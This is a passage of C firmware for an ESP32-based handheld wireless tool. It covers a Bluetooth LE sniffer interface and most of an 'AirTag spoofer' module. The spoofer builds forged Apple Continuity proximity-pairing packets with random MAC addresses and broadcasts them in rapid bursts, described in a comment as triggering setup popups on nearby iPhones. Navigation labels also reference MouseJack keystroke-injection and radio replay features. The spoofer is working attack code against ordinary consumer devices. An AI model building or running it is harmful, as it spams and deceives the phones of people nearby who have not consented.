      switch (activeIcon) {
        case 0:
          ble_sniffer_deviceCount = 0;
          ble_sniffer_suspiciousCount = 0;
          ble_sniffer_lastDeviceCount = -1;
          ble_sniffer_lastSuspiciousCount = -1;
          ble_sniffer_lineNumber = 1;
          for (int i = 0; i < MAX_LINES; i++) {
            ble_sniffer_displayLines[i].text = TEXT("");
            ble_sniffer_displayLines[i].color = GREEN;
            ble_sniffer_displayLines[i].originalColor = GREEN;
            ble_sniffer_displayLines[i].isAlert = false;
            ble_sniffer_displayLines[i].flashUntil = 0;
            ble_sniffer_displayLines[i].type = BleSniffer_MessageType_DEVICE;
          }
          ble_sniffer_refreshDisplay();
          ble_sniffer_addLine(TEXT("Device list reset"), DARK_GRAY, true,
                              BleSniffer_MessageType_STATUS);
          break;
        case 1:
          ble_sniffer_filterSuspicious();
          break;
        case 2:
          feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_headerTouchHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    int hitIcon = -1;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > BleSniffer_iconX[i] && x < BleSniffer_iconX[i] + ICON_SIZE) {
            if (BleSniffer_icons[i] != NULL && animationState == 0) {
              hitIcon = i;
            }
            break;
          }
        }
      }
    }
    if (hitIcon >= 0) {
      if (!s_headerTouchHeld) {
        if (hitIcon == 2) {
          feature_exit_requested = true;
        } else {
          display_draw_bitmap(&(tft), BleSniffer_iconX[hitIcon], iconY,
                              BleSniffer_icons[hitIcon], ICON_SIZE, ICON_SIZE,
                              TFT_BLACK);
          animationState = 1;
          activeIcon = hitIcon;
          lastAnimationTime = sys_monotonic_ms();
        }
      }
      s_headerTouchHeld = true;
    } else {
      s_headerTouchHeld = false;
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}
static void ble_sniffer_setup(void) {
  if (!ble_sniffer_devices)
    ble_sniffer_devices = (BleSniffer_DeviceInfo*)calloc(
        MAX_DEVICES, sizeof(*ble_sniffer_devices));
  if (!ble_sniffer_displayLines)
    ble_sniffer_displayLines = (BleSniffer_DisplayLine*)calloc(
        MAX_LINES, sizeof(*ble_sniffer_displayLines));
  if (!ble_sniffer_devices || !ble_sniffer_displayLines) {
    feature_exit_requested = true;
    return;
  }
  BleSniffer_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false, false);
  ble_sniffer_runUI();

  setupTouchscreen();

  ble_sniffer_initDisplay();

  ble_sniffer_releaseBleCallbacks();
  ble_sniffer_pBLEScan = ble_service_scan();
  if (!ble_sniffer_advertisements)
    ble_sniffer_advertisements =
        xQueueCreate(8, sizeof(ble_sniffer_advertisement_t));
  if (!ble_sniffer_advertisements || !ble_sniffer_pBLEScan) {
    feature_exit_requested = true;
    return;
  }
  xQueueReset(ble_sniffer_advertisements);
  ble_scan_set_callback(ble_sniffer_pBLEScan, ble_sniffer_on_result, NULL);
  (ble_sniffer_pBLEScan->active = true);
  ble_sniffer_scanning = true;

  ble_sniffer_addLine(TEXT("Bluetooth Sniffer Ready"), DARK_GRAY, true,
                      BleSniffer_MessageType_STATUS);
  ble_sniffer_startBLEScan();
}
static void ble_sniffer_loop(void) {
  if (feature_exit_requested || featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  ble_sniffer_advertisement_t advertisement =
      ble_sniffer_advertisement_t_INITIALIZER;
  while (ble_sniffer_advertisements &&
         xQueueReceive(ble_sniffer_advertisements, &advertisement, 0) ==
             pdTRUE) {
    int index = -1;
    for (int i = 0; i < ble_sniffer_deviceCount; ++i) {
      if ((strcmp((ble_sniffer_devices[i].mac).data,
                  (TEXT(advertisement.mac)).data) == 0)) {
        index = i;
        break;
      }
    }
    if (index < 0)
      ble_sniffer_processNewDevice(&(advertisement));
    else {
      __auto_type device = &(ble_sniffer_devices[index]);
      (*device).rssi = advertisement.rssi;
      ++(*device).packetCount;
      (*device).lastSeen = advertisement.timestamp;
      ble_sniffer_checkSuspiciousActivity(index, advertisement.timestamp);
    }
  }
  unsigned long now = sys_monotonic_ms();
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  ble_sniffer_runUI();
  if (feature_exit_requested || featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }
  updateStatusBar();
  ble_sniffer_cleanupDevices(now);
  if (ble_sniffer_scanning && now - ble_sniffer_lastScanTime >= SCAN_INTERVAL) {
    ble_sniffer_startBLEScan();
    ble_sniffer_isBLEScanActive = true;
    ble_sniffer_lastScanTime = now;
  }
  if (div_console_pending()) {
    text_t input = {0};
    while (div_console_pending()) {
      char ch = (char)div_console_read_byte();
      if (ch == '\r') {
        continue;
      }
      if (ch == '\n') {
        break;
      }
      text_append_cstr(&(input), (TEXT(ch)).data);
    }
    text_trim(&(input));
    if (text_prefix_cstr((input).data, "FILTER MAC ")) {
      ble_sniffer_filterByMac(text_slice(input, 11, SIZE_MAX));
    } else if ((strcmp((input).data, "FILTER SUSPICIOUS") == 0)) {
      ble_sniffer_filterSuspicious();
    } else if ((strcmp((input).data, "RESET") == 0)) {
      ble_sniffer_deviceCount = 0;
      ble_sniffer_suspiciousCount = 0;
      ble_sniffer_lastDeviceCount = -1;
      ble_sniffer_lastSuspiciousCount = -1;
      ble_sniffer_lineNumber = 1;
      for (int i = 0; i < MAX_LINES; i++) {
        ble_sniffer_displayLines[i].text = TEXT("");
        ble_sniffer_displayLines[i].color = GREEN;
        ble_sniffer_displayLines[i].originalColor = GREEN;
        ble_sniffer_displayLines[i].isAlert = false;
        ble_sniffer_displayLines[i].flashUntil = 0;
        ble_sniffer_displayLines[i].type = BleSniffer_MessageType_DEVICE;
      }
      ble_sniffer_refreshDisplay();
      ble_sniffer_addLine(TEXT("Device list reset"), DARK_GRAY, true,
                          BleSniffer_MessageType_STATUS);
    }
  }
}
static void ble_sniffer_startBLEScan(void) {
  if (!ble_sniffer_pBLEScan || ble_scan_is_active(ble_sniffer_pBLEScan)) return;
  ble_sniffer_newDevicesThisScan = 0;
  ble_scan_clear(ble_sniffer_pBLEScan);
  if (!ble_scan_start(ble_sniffer_pBLEScan,
                      BleSniffer_Config_bleScanDuration * 1000, false)) {
    ble_sniffer_addLine(TEXT("BLE scan failed"), RED, true,
                        BleSniffer_MessageType_ALERT);
  }
  ble_sniffer_lastScanTime = sys_monotonic_ms();
  ble_sniffer_updateHeader();
}
static void ble_sniffer_stop(void) {
  ble_sniffer_scanning = false;
  ble_sniffer_releaseBleCallbacks();
  free(ble_sniffer_devices);
  ble_sniffer_devices = NULL;
  free(ble_sniffer_displayLines);
  ble_sniffer_displayLines = NULL;
  ble_sniffer_deviceCount = 0;
}
static void ble_sniffer_on_result(const ble_device_t* device, void* context) {
  (void)context;
  if (!device || !ble_sniffer_scanning || !ble_sniffer_advertisements) return;
  ble_sniffer_advertisement_t a = ble_sniffer_advertisement_t_INITIALIZER;
  __auto_type address = ble_device_address(device);
  __auto_type device_name = ble_device_name(device);
  __auto_type service = ble_device_service_uuid(device);
  div_copy_string(a.mac, sizeof(a.mac), address.data);
  div_copy_string(a.name, sizeof(a.name), device_name.data);
  div_copy_string(a.service, sizeof(a.service), service.data);
  size_t length = 0;
  const uint8_t* bytes = ble_device_field(device, 0xff, &length);
  a.manufacturerSize = DIV_MIN(length, sizeof(a.manufacturer));
  if (bytes) memcpy(a.manufacturer, bytes, a.manufacturerSize);
  a.rssi = device->rssi;
  a.timestamp = sys_monotonic_ms();
  xQueueSend(ble_sniffer_advertisements, &a, 0);
}

void BleSniffer_blesnifferSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);
  {
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true, false);
  }
  redrawTouchButtonBar();
  {
    const int bodyH = bleContentBottom() - 37;
    if (bodyH > 0) {
      display_fill_rect(&(tft), 0, 37, 240, bodyH, TFT_BLACK);
    }
  }
  ble_sniffer_setup();

  redrawTouchButtonBar();
}

void BleSniffer_blesnifferLoop(void) {
  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  ble_sniffer_loop();
}

void BleSniffer_exit(void) { ble_sniffer_stop(); }

static bool ensureBleStackReady(void) {
  return ble_service_ready() || (ble_service_init(ESP32DIV_NAME) == ESP_OK);
}
static bool bleRequireStackOrExit(void) {
  if (ensureBleStackReady()) return true;
  showNotification("Bluetooth", "Unable to initialize BLE");
  feature_exit_requested = true;
  return false;
}
static void bleSetEsbReplayNavLabels(void) {
  setTouchNavLabels("Prev", "Arm", "Exit", "Play", "Next");
}
static void bleSetMouseJackNavLabels(void) {
  setTouchNavLabels("Clr", "Pause", "Exit", NULL, NULL);
}
static void bleSetMjInjectNavLabels(void) {
  setTouchNavLabels("Prev", "Pay", "Exit", "Fire", "Next");
}

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 1

enum { AirTagSpoofer_INFO_Y = 42 };
enum { AirTagSpoofer_ROW_H = 16 };
enum { AirTagSpoofer_COL_LABEL_X = 10 };
enum { AirTagSpoofer_COL_VALUE_X = 58 };
enum { AirTagSpoofer_COL_VALUE_W = 120 };
enum { AirTagSpoofer_COL_RIGHT_MARGIN = 10 };
enum { AirTagSpoofer_FIELD_H = 10 };
enum { AirTagSpoofer_LOG_HDR_Y = 118 };
enum { AirTagSpoofer_LOG_Y = 134 };
enum { AirTagSpoofer_LINE_H = 12 };
enum { AirTagSpoofer_MAX_LOG = 16 };
static const unsigned long AirTagSpoofer_BTN_DEBOUNCE_MS = 220;
static const unsigned long AirTagSpoofer_BURST_INTERVAL_MS = 120;
static const unsigned long AirTagSpoofer_UI_FIELD_MS = 500;
static const unsigned long AirTagSpoofer_LOG_INTERVAL_MS = 1200;
enum { AirTagSpoofer_LOG_LINE_LEN = 40 };

// Apple Continuity Proximity Pairing â€” AirTag models (Flipper / Xtreme).
// Prefix 0x05 = "New AirTag" (triggers setup popup on nearby iPhones).
static const uint16_t AirTagSpoofer_kAirTagModels[] = {0x0055, 0x0030};
enum { AirTagSpoofer_kAirTagModelCount = 2 };

static int AirTagSpoofer_iconX[ICON_NUM] = {10};
static int AirTagSpoofer_iconY = STATUS_BAR_Y_OFFSET;
static bool AirTagSpoofer_s_uiDrawn = false;
static bool AirTagSpoofer_s_staticDrawn = false;
static bool AirTagSpoofer_s_running = false;
static bool AirTagSpoofer_s_advConfigured = false;
static unsigned long AirTagSpoofer_s_lastBtnMs = 0;
static unsigned long AirTagSpoofer_s_lastBurstMs = 0;
static unsigned long AirTagSpoofer_s_lastFieldMs = 0;
static unsigned long AirTagSpoofer_s_lastLogMs = 0;
static uint32_t AirTagSpoofer_s_txCount = 0;
static int AirTagSpoofer_s_modelIndex = 0;

static uint8_t AirTagSpoofer_s_mac[6];
static uint8_t AirTagSpoofer_s_packet[31];

static ble_advertiser_t* AirTagSpoofer_s_advertising = NULL;
static const char* AirTagSpoofer_s_advUuid =
    "00003082-0000-1000-9000-00805f9b34fb";

static char AirTagSpoofer_s_log[AirTagSpoofer_MAX_LOG]
                               [AirTagSpoofer_LOG_LINE_LEN];
static uint16_t AirTagSpoofer_s_logColor[AirTagSpoofer_MAX_LOG];
static int AirTagSpoofer_s_logCount = 0;
static char AirTagSpoofer_s_dispLog[AirTagSpoofer_MAX_LOG]
                                   [AirTagSpoofer_LOG_LINE_LEN];
static uint16_t AirTagSpoofer_s_dispColor[AirTagSpoofer_MAX_LOG];
static int AirTagSpoofer_s_dispCount = 0;

static char AirTagSpoofer_s_cacheModel[16] = {0};
static char AirTagSpoofer_s_cacheMac[24] = {0};
static char AirTagSpoofer_s_cacheTx[16] = {0};
static char AirTagSpoofer_s_cacheHint[40] = {0};

static int AirTagSpoofer_rowY(int row) {
  return AirTagSpoofer_INFO_Y + 4 + row * AirTagSpoofer_ROW_H;
}

static int AirTagSpoofer_logBottomY(void) {
  // Leave a 2px gap above the touch nav bar.
  return bleContentBottom() - 2;
}

static int AirTagSpoofer_logVisibleLines(void) {
  const int h = AirTagSpoofer_logBottomY() - AirTagSpoofer_LOG_Y;
  if (h < AirTagSpoofer_LINE_H) {
    return 1;
  }
  int n = h / AirTagSpoofer_LINE_H;
  if (n > AirTagSpoofer_MAX_LOG) {
    n = AirTagSpoofer_MAX_LOG;
  }
  return n;
}

static void AirTagSpoofer_updateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  setTouchNavLabels(AirTagSpoofer_s_running ? "Stop" : "Start", "Model", "Exit",
                    NULL, NULL);
  redrawTouchButtonBar();
}

static const char* AirTagSpoofer_modelName(int idx) {
  switch (AirTagSpoofer_kAirTagModels[idx % AirTagSpoofer_kAirTagModelCount]) {
    case 0x0055:
      return "AirTag";
    case 0x0030:
      return "AirTag Alt";
    default:
      return "AirTag";
  }
}

static void AirTagSpoofer_buildProximityPacket(void) {
  const uint16_t model =
      AirTagSpoofer_kAirTagModels[AirTagSpoofer_s_modelIndex %
                                  AirTagSpoofer_kAirTagModelCount];
  int i = 0;
  AirTagSpoofer_s_packet[i++] = 0x1e;
  AirTagSpoofer_s_packet[i++] = 0xff;
  AirTagSpoofer_s_packet[i++] = 0x4c;
  AirTagSpoofer_s_packet[i++] = 0x00;
  AirTagSpoofer_s_packet[i++] = 0x07;
  AirTagSpoofer_s_packet[i++] = 0x19;
  AirTagSpoofer_s_packet[i++] = 0x05;
  AirTagSpoofer_s_packet[i++] = (uint8_t)((model >> 8) & 0xFF);
  AirTagSpoofer_s_packet[i++] = (uint8_t)(model & 0xFF);
  AirTagSpoofer_s_packet[i++] = 0x55;
  AirTagSpoofer_s_packet[i++] =
      (uint8_t)(((sys_random_range_1(10)) << 4) | (sys_random_range_1(10)));
  AirTagSpoofer_s_packet[i++] =
      (uint8_t)(((sys_random_range_1(8)) << 4) | (sys_random_range_1(10)));
  AirTagSpoofer_s_packet[i++] = (uint8_t)sys_random_range_1(256);
  AirTagSpoofer_s_packet[i++] = 0x00;
  AirTagSpoofer_s_packet[i++] = 0x00;
  esp_fill_random(&AirTagSpoofer_s_packet[i], 16);
  i += 16;
  while (i < 31) {
    AirTagSpoofer_s_packet[i++] = 0x00;
  }

  for (int b = 0; b < 6; b++) {
    AirTagSpoofer_s_mac[b] = (uint8_t)sys_random_range_1(256);
  }
  AirTagSpoofer_s_mac[0] |= 0xC0;
}

static void AirTagSpoofer_paintField(int x, int y, int w, char* cache,
                                     size_t cacheSz, const char* text,
                                     uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  display_set_text_size(&(tft), 1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = display_text_width(&(tft), cache, 0) + 2;
    const int newW = text[0] ? (display_text_width(&(tft), text, 0) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  display_fill_rect(&(tft), x, y, clearW, AirTagSpoofer_FIELD_H, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), x, y);
  display_print(&(tft), (TEXT(text)).data);

  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void AirTagSpoofer_paintFieldRight(int y, int rightMargin, char* cache,
                                          size_t cacheSz, const char* text,
                                          uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  display_set_text_size(&(tft), 1);
  const int newW = text[0] ? display_text_width(&(tft), text, 0) : 0;
  const int oldW =
      (cache && cache[0]) ? display_text_width(&(tft), cache, 0) : 0;
  const int useW = oldW > newW ? oldW : newW;
  const int clearW = useW + 2;
  display_fill_rect(&(tft), SCREEN_WIDTH - rightMargin - clearW, y, clearW,
                    AirTagSpoofer_FIELD_H, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), SCREEN_WIDTH - rightMargin - newW, y);
  display_print(&(tft), (TEXT(text)).data);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void AirTagSpoofer_drawStaticChrome(void) {
  if (AirTagSpoofer_s_staticDrawn) {
    return;
  }
  AirTagSpoofer_s_staticDrawn = true;

  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
  display_set_cursor(&(tft), AirTagSpoofer_COL_LABEL_X, AirTagSpoofer_rowY(0));
  display_print(&(tft), "MODEL");
  display_set_cursor(&(tft), AirTagSpoofer_COL_LABEL_X, AirTagSpoofer_rowY(1));
  display_print(&(tft), "MAC");
  display_set_cursor(&(tft), AirTagSpoofer_COL_LABEL_X, AirTagSpoofer_rowY(2));
  display_print(&(tft), "PROTO");

  display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
  display_set_cursor(&(tft), AirTagSpoofer_COL_VALUE_X, AirTagSpoofer_rowY(2));
  display_print(&(tft), "Continuity 0x07");

  display_fill_rect(&(tft), 0, AirTagSpoofer_LOG_HDR_Y, SCREEN_WIDTH,
                    AirTagSpoofer_LOG_Y - AirTagSpoofer_LOG_HDR_Y, TFT_BLACK);
  display_set_text_color_2(&(tft), ORANGE, TFT_BLACK);
  display_set_cursor(&(tft), AirTagSpoofer_COL_LABEL_X,
                     AirTagSpoofer_LOG_HDR_Y + 2);
  display_print(&(tft), "ACTIVITY");
  const int ruleX =
      AirTagSpoofer_COL_LABEL_X + display_text_width(&(tft), "ACTIVITY", 0) + 8;
  display_draw_fast_h_line(
      &(tft), ruleX, AirTagSpoofer_LOG_HDR_Y + 6,
      SCREEN_WIDTH - AirTagSpoofer_COL_RIGHT_MARGIN - ruleX, UI_LINE);
}

static void AirTagSpoofer_updateInfoFields(bool force) {
  AirTagSpoofer_drawStaticChrome();

  if (force) {
    AirTagSpoofer_s_cacheModel[0] = '\0';
    AirTagSpoofer_s_cacheMac[0] = '\0';
    AirTagSpoofer_s_cacheTx[0] = '\0';
    AirTagSpoofer_s_cacheHint[0] = '\0';
  }

  char mac[24];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           AirTagSpoofer_s_mac[0], AirTagSpoofer_s_mac[1],
           AirTagSpoofer_s_mac[2], AirTagSpoofer_s_mac[3],
           AirTagSpoofer_s_mac[4], AirTagSpoofer_s_mac[5]);
  char tx[16];
  snprintf(tx, sizeof(tx), "TX %lu", (unsigned long)AirTagSpoofer_s_txCount);
  const char* hint = AirTagSpoofer_s_running ? "Unlock iPhone, stay nearby"
                                             : "Press Start to begin";

  AirTagSpoofer_paintField(
      AirTagSpoofer_COL_VALUE_X, AirTagSpoofer_rowY(0),
      AirTagSpoofer_COL_VALUE_W, AirTagSpoofer_s_cacheModel,
      sizeof(AirTagSpoofer_s_cacheModel),
      AirTagSpoofer_modelName(AirTagSpoofer_s_modelIndex), WHITE);
  AirTagSpoofer_paintFieldRight(
      AirTagSpoofer_rowY(0), AirTagSpoofer_COL_RIGHT_MARGIN,
      AirTagSpoofer_s_cacheTx, sizeof(AirTagSpoofer_s_cacheTx), tx,
      UI_DIM_TEXT);
  AirTagSpoofer_paintField(AirTagSpoofer_COL_VALUE_X, AirTagSpoofer_rowY(1),
                           AirTagSpoofer_COL_VALUE_W + 40,
                           AirTagSpoofer_s_cacheMac,
                           sizeof(AirTagSpoofer_s_cacheMac), mac, WHITE);
  AirTagSpoofer_paintField(AirTagSpoofer_COL_LABEL_X, AirTagSpoofer_rowY(3),
                           SCREEN_WIDTH - 20, AirTagSpoofer_s_cacheHint,
                           sizeof(AirTagSpoofer_s_cacheHint), hint,
                           UI_DIM_TEXT);
}

static void AirTagSpoofer_paintLogSlot(int index, const char* text,
                                       uint16_t color) {
  const int cap = AirTagSpoofer_logVisibleLines();
  const int bottom = AirTagSpoofer_logBottomY();
  if (index < 0 || index >= cap) {
    return;
  }
  if (!text) {
    text = "";
  }

  const int y = AirTagSpoofer_LOG_Y + index * AirTagSpoofer_LINE_H;
  if (y + AirTagSpoofer_LINE_H > bottom) {
    return;
  }

  // Only repaint when the on-screen slot actually changes.
  if (strcmp(AirTagSpoofer_s_dispLog[index], text) == 0 &&
      AirTagSpoofer_s_dispColor[index] == color) {
    return;
  }

  display_set_text_size(&(tft), 1);
  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, AirTagSpoofer_LINE_H,
                    TFT_BLACK);
  if (text[0]) {
    display_set_text_color_2(&(tft), color, TFT_BLACK);
    display_set_cursor(&(tft), AirTagSpoofer_COL_LABEL_X, y);
    display_print(&(tft), (TEXT(text)).data);
  }

  strncpy(AirTagSpoofer_s_dispLog[index], text, AirTagSpoofer_LOG_LINE_LEN - 1);
  AirTagSpoofer_s_dispLog[index][AirTagSpoofer_LOG_LINE_LEN - 1] = '\0';
  AirTagSpoofer_s_dispColor[index] = color;
}

static void AirTagSpoofer_syncLogDisplay(void) {
  const int cap = AirTagSpoofer_logVisibleLines();
  for (int i = 0; i < cap; i++) {
    if (i < AirTagSpoofer_s_logCount) {
      AirTagSpoofer_paintLogSlot(i, AirTagSpoofer_s_log[i],
                                 AirTagSpoofer_s_logColor[i]);
    } else if (AirTagSpoofer_s_dispLog[i][0]) {
      AirTagSpoofer_paintLogSlot(i, "", TFT_BLACK);
    }
  }
  AirTagSpoofer_s_dispCount = AirTagSpoofer_s_logCount;
}

static void AirTagSpoofer_logLine(const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  const int cap = AirTagSpoofer_logVisibleLines();
  const bool scrolled = (AirTagSpoofer_s_logCount >= cap);

  if (scrolled) {
    for (int i = 0; i < cap - 1; i++) {
      memcpy(AirTagSpoofer_s_log[i], AirTagSpoofer_s_log[i + 1],
             AirTagSpoofer_LOG_LINE_LEN);
      AirTagSpoofer_s_logColor[i] = AirTagSpoofer_s_logColor[i + 1];
    }
    AirTagSpoofer_s_logCount = cap - 1;
  }

  strncpy(AirTagSpoofer_s_log[AirTagSpoofer_s_logCount], text,
          AirTagSpoofer_LOG_LINE_LEN - 1);
  AirTagSpoofer_s_log[AirTagSpoofer_s_logCount]
                     [AirTagSpoofer_LOG_LINE_LEN - 1] = '\0';
  AirTagSpoofer_s_logColor[AirTagSpoofer_s_logCount] = color;
  const int lineIdx = AirTagSpoofer_s_logCount;
  AirTagSpoofer_s_logCount++;

  if (scrolled) {
    // Shifted lines: update each dirty slot only (no full-zone wipe).
    AirTagSpoofer_syncLogDisplay();
    return;
  }

  AirTagSpoofer_paintLogSlot(lineIdx, AirTagSpoofer_s_log[lineIdx], color);
  AirTagSpoofer_s_dispCount = AirTagSpoofer_s_logCount;
}

static void AirTagSpoofer_ensureAdvertising(void) {
  if (!AirTagSpoofer_s_advertising) {
    ensureBleStackReady();

    AirTagSpoofer_s_advertising = ble_service_advertiser();
    AirTagSpoofer_s_advConfigured = false;
  }
}

static void AirTagSpoofer_burstOnce(bool forceLog) {
  AirTagSpoofer_ensureAdvertising();
  AirTagSpoofer_buildProximityPacket();

  ble_adv_data_t advData = {0};
  ble_adv_append(&(advData), AirTagSpoofer_s_packet, 31);

  // Match Sour Apple: update payload + start, do not stop/restart each burst
  // (repeated stop/start + addServiceUUID was resetting the ESP32).
  if (!AirTagSpoofer_s_advConfigured) {
    ble_advertising_service_uuid(AirTagSpoofer_s_advertising,
                                 AirTagSpoofer_s_advUuid);
    (AirTagSpoofer_s_advertising->min_interval = 0x20);
    (AirTagSpoofer_s_advertising->max_interval = 0x20);
    ble_advertising_preferred(AirTagSpoofer_s_advertising, 0x20, 0x20);

    AirTagSpoofer_s_advConfigured = true;
  }
  (AirTagSpoofer_s_advertising->data = advData);
  ble_advertising_start(AirTagSpoofer_s_advertising);

  AirTagSpoofer_s_txCount++;
  AirTagSpoofer_s_lastBurstMs = sys_monotonic_ms();

  const unsigned long now = sys_monotonic_ms();
  if (now - AirTagSpoofer_s_lastFieldMs >= AirTagSpoofer_UI_FIELD_MS) {
    AirTagSpoofer_s_lastFieldMs = now;
    AirTagSpoofer_updateInfoFields(false);
  }

  if (forceLog ||
      (now - AirTagSpoofer_s_lastLogMs >= AirTagSpoofer_LOG_INTERVAL_MS)) {
    AirTagSpoofer_s_lastLogMs = now;
    char line[AirTagSpoofer_LOG_LINE_LEN];
    snprintf(line, sizeof(line), "[+] %s  %02X:%02X:%02X  #%lu",
             AirTagSpoofer_modelName(AirTagSpoofer_s_modelIndex),
             AirTagSpoofer_s_mac[0], AirTagSpoofer_s_mac[1],
             AirTagSpoofer_s_mac[2], (unsigned long)AirTagSpoofer_s_txCount);
    AirTagSpoofer_logLine(line, ORANGE);
  }
}

static void AirTagSpoofer_stopAdvertising(void) {
  if (AirTagSpoofer_s_advertising) {
    ble_advertising_stop(AirTagSpoofer_s_advertising);
  }
  AirTagSpoofer_s_running = false;
  AirTagSpoofer_updateInfoFields(true);
  AirTagSpoofer_updateNavLabels();
  AirTagSpoofer_logLine("[*] Stopped", UI_DIM_TEXT);
}

static void AirTagSpoofer_startAdvertising(void) {
  AirTagSpoofer_ensureAdvertising();
  AirTagSpoofer_s_running = true;
  AirTagSpoofer_s_lastFieldMs = 0;
  AirTagSpoofer_s_lastLogMs = 0;
  AirTagSpoofer_updateInfoFields(true);
  AirTagSpoofer_updateNavLabels();
  AirTagSpoofer_logLine("[+] AirTag Continuity live", ORANGE);
  AirTagSpoofer_burstOnce(true);
}

static void AirTagSpoofer_runUI(void) {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};

  if (!AirTagSpoofer_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), AirTagSpoofer_iconX[i], AirTagSpoofer_iconY,
                            icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    AirTagSpoofer_s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > AirTagSpoofer_iconX[i] &&
              x < AirTagSpoofer_iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void AirTagSpoofer_handleButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - AirTagSpoofer_s_lastBtnMs < AirTagSpoofer_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (AirTagSpoofer_s_running) {
      AirTagSpoofer_stopAdvertising();
    } else {
      AirTagSpoofer_startAdvertising();
    }
    AirTagSpoofer_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    AirTagSpoofer_s_modelIndex =
        (AirTagSpoofer_s_modelIndex + 1) % AirTagSpoofer_kAirTagModelCount;
    AirTagSpoofer_updateInfoFields(true);
    AirTagSpoofer_updateNavLabels();
    char line[36];
    snprintf(line, sizeof(line), "[*] Model -> %s",
             AirTagSpoofer_modelName(AirTagSpoofer_s_modelIndex));
    AirTagSpoofer_logLine(line, ORANGE);
    AirTagSpoofer_s_lastBtnMs = now;
    return;
  }
}

static void AirTagSpoofer_teardown(void) {
  if (AirTagSpoofer_s_advertising) {
    ble_advertising_stop(AirTagSpoofer_s_advertising);
  }
  AirTagSpoofer_s_running = false;
  AirTagSpoofer_s_advConfigured = false;
  AirTagSpoofer_s_advertising = NULL;
}

void AirTagSpoofer_airTagSetup(void) {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);

  setupTouchscreen();
  AirTagSpoofer_s_uiDrawn = false;
  AirTagSpoofer_s_staticDrawn = false;
  AirTagSpoofer_s_running = false;
  AirTagSpoofer_s_advConfigured = false;
  AirTagSpoofer_s_txCount = 0;
  AirTagSpoofer_s_logCount = 0;
  AirTagSpoofer_s_dispCount = 0;
  AirTagSpoofer_s_advertising = NULL;
  AirTagSpoofer_s_lastBtnMs = 0;
  AirTagSpoofer_s_lastBurstMs = 0;
  AirTagSpoofer_s_lastFieldMs = 0;
  AirTagSpoofer_s_lastLogMs = 0;
  AirTagSpoofer_s_modelIndex = 0;
